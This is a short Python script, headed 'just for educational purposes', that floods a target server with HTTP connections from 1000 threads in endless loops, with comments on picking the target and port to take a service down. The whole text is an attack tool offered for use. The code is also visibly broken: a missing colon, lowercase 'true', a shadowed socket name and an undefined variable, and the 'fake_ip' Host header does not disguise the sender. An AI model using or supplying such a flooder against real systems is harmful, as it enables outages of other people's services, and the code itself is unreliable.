#Just for educational purposes.

import threading
import socket

Target = 'ip address'            #ip address of the targeted server(you can choose your own router)
Port = 80                    #which service you want to takedown
fake_ip = 'ip address'           #any ip address where you wanted it to be routed to

def attacK()
    while true:                  #running in infinite loop to bombard the server connections
        socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)      #creating a new socket on the internet
        socket.connect((Target, Port))
        socket.sendto(("GET /" + TARGET + "HTTP/1.1 \r\n").encode('ascii'),(Target,Port))
        socket.sendto(("HOST: " + fake_ip + "\r\n\r\n").encode('ascii'), (Target, Port))
        socket.close()

for i in range (1000):                              #Basically how many times you want it to be called
    thread = threading.Thread(target=attacK)        #the Target here is the target function and not the ip address
    thread.start()